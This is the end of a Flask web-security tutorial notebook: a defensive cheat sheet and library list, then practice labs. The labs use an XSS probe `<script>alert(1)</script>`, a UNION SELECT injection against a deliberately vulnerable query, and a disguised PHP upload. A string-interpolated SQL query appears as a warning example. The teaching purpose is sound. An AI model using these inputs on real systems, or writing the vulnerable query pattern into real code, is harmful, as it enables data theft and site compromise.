| File upload | `app/views/profile.py` | `allowed_extension()` + magic bytes |
| Secret management | `.env.example` | `SECRET_KEY=<generate-with-secrets>` |

**Tools used in the wild:**
- [`flask-wtf`](https://flask-wtf.readthedocs.io/) — CSRF + WTForms integration  
- [`flask-talisman`](https://github.com/GoogleCloudPlatform/flask-talisman) — Security headers  
- [`bleach`](https://bleach.readthedocs.io/) — Sanitise user-supplied HTML  
- [`python-magic`](https://github.com/ahupp/python-magic) — File MIME type detection  
- [`pip-audit`](https://pypi.org/project/pip-audit/) — Scan dependencies for CVEs

In [ ]:
# ── Cheat sheet ─────────────────────────────────────────────────────────────

cheat_sheet = """
╔══════════════════════════════════════════════════════════════════╗
║            FLASK SECURITY BEST PRACTICES — CHEAT SHEET          ║
╠══════════════════════════════════════════════════════════════════╣
║  CSRF TOKENS                                                     ║
║  ─────────────────────────────────────────────────────────────  ║
║  CSRFProtect(app)                    # one-line app protection   ║
║  {{ form.hidden_tag() }}             # in every HTML <form>      ║
║  X-CSRFToken: {{ csrf_token() }}     # AJAX header               ║
╠══════════════════════════════════════════════════════════════════╣
║  XSS ESCAPING RULES                                              ║
║  ─────────────────────────────────────────────────────────────  ║
║  {{ var }}          → SAFE   (Jinja2 escapes automatically)      ║
║  {{ var | safe }}   → DANGER (raw HTML — only for trusted data)  ║
║  escape(var)        → Python equivalent of {{ var }}             ║
╠══════════════════════════════════════════════════════════════════╣
║  SQL INJECTION PREVENTION                                        ║
║  ─────────────────────────────────────────────────────────────  ║
║  User.query.filter_by(username=u)    # ORM — always safe         ║
║  text("WHERE id = :id"), {"id": i}   # raw SQL — parameterised   ║
║  NEVER: f"WHERE username = '{u}'"    # string interp — DANGEROUS ║
╠══════════════════════════════════════════════════════════════════╣
║  SECURITY HEADERS (Flask-Talisman)                               ║
║  ─────────────────────────────────────────────────────────────  ║
║  Talisman(app)                       # good defaults instantly   ║
║  Talisman(app, content_security_policy=csp)  # custom CSP        ║
╠══════════════════════════════════════════════════════════════════╣
║  SECRET MANAGEMENT                                               ║
║  ─────────────────────────────────────────────────────────────  ║
║  SECRET_KEY = os.environ['SECRET_KEY']  # NEVER hardcode         ║
║  python -c "import secrets; print(secrets.token_hex(32))"        ║
║  Add .env to .gitignore BEFORE first commit                      ║
╠══════════════════════════════════════════════════════════════════╣
║  FILE UPLOADS                                                    ║
║  ─────────────────────────────────────────────────────────────  ║
║  Check extension AND magic bytes                                 ║
║  Store outside web root, rename to UUID                          ║
║  MAX_CONTENT_LENGTH = 2 * 1024 * 1024  # 2 MB limit             ║
╚══════════════════════════════════════════════════════════════════╝
"""
print(cheat_sheet)


## 11.12  Practice Prompts

Try these exercises to solidify your understanding:

1. **CSRF lab** — Create a tiny Flask app with a "change email" form. Confirm `CSRFProtect` blocks a raw `curl -X POST` without the token. Then add the token to the curl command and confirm it succeeds.

2. **XSS lab** — Render `{{ user_comment }}` and `{{ user_comment | safe }}` side-by-side in a template. Pass `<script>alert(1)</script>` as the comment and observe the difference in the browser.

3. **SQL injection lab** — Reproduce the sqlite3 demo from this chapter. Add a `comments` column with sensitive data and verify the `UNION SELECT` injection leaks it via the vulnerable query.

4. **Talisman headers** — Add `flask-talisman` to a project. Use `curl -I https://localhost:5000/` to inspect the response headers before and after.

5. **File upload bypass** — Create a file with a `.jpg` extension but PHP content. Write a validator that checks magic bytes and confirm it rejects the file.

6. **Secret rotation** — Commit a fake `SECRET_KEY` to a local repo, then immediately rotate it. Document the steps you'd follow in a real incident (invalidate sessions, notify users, audit logs).

7. **Security audit** — Take any Flask app you have built previously and run through the security checklist from §11.9. Fix at least three items you find missing.

<div style='width:100%; display:flex; justify-content:space-between; align-items:center; margin: 1em 0;'>
  <a href='10.%20user_authentication_with_flask_login.ipynb' style='padding:6px 14px; background:#007bff; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>← Chapter 10: Authentication</a>
  <a href='../TOC.md' style='padding:6px 14px; background:#6c757d; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>📚 Table of Contents</a>
  <a href='../5.%20building_apis/12.%20building_rest_apis.ipynb' style='padding:6px 14px; background:#28a745; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>Chapter 12: REST APIs →</a>
</div>